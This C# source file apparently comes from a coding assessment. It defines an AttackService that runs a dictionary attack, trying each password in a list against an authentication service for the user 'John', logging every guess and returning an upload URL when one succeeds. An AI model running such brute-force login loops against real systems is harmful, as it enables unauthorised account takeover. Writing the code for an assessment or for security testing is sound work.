using Microsoft.Extensions.Logging;
using WarpAssessment.Interfaces;

namespace WarpAssessment.Services;

/// <summary>
/// Orchestrates the password cracking attack by trying each password against the authentication service.
/// </summary>
public class AttackService
{
    private readonly IAuthService _authService;
    private readonly ILogger<AttackService> _logger;

    public AttackService(IAuthService authService, ILogger<AttackService> logger)
    {
        _authService = authService ?? throw new ArgumentNullException(nameof(authService));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Executes the attack by attempting each password sequentially.
    /// Returns the upload URL when successful, or null if all passwords fail.
    /// </summary>
    public async Task<string?> ExecuteAsync(IEnumerable<string> passwords)
    {
        if (passwords == null)
            throw new ArgumentNullException(nameof(passwords));

        var passwordList = passwords.ToList();
        _logger.LogInformation($"Starting attack with {passwordList.Count} passwords");

        int attempt = 0;
        foreach (var password in passwordList)
        {
            attempt++;
            _logger.LogInformation($"[Attempt {attempt}/{passwordList.Count}] Trying: {password}");

            try
            {
                var result = await _authService.AuthenticateAsync("John", password);

                if (result != null)
                {
                    _logger.LogInformation($"SUCCESS: Password found! '{password}' yielded upload URL");
                    return result;
                }

                // Small delay between attempts to avoid overwhelming the server
                await Task.Delay(50);
            }
            catch (Exception ex)
            {
                _logger.LogWarning($"Error testing password '{password}': {ex.Message}");
                // Continue to next password
            }
        }

        _logger.LogWarning("Attack failed - no valid password found");
        return null;
    }
}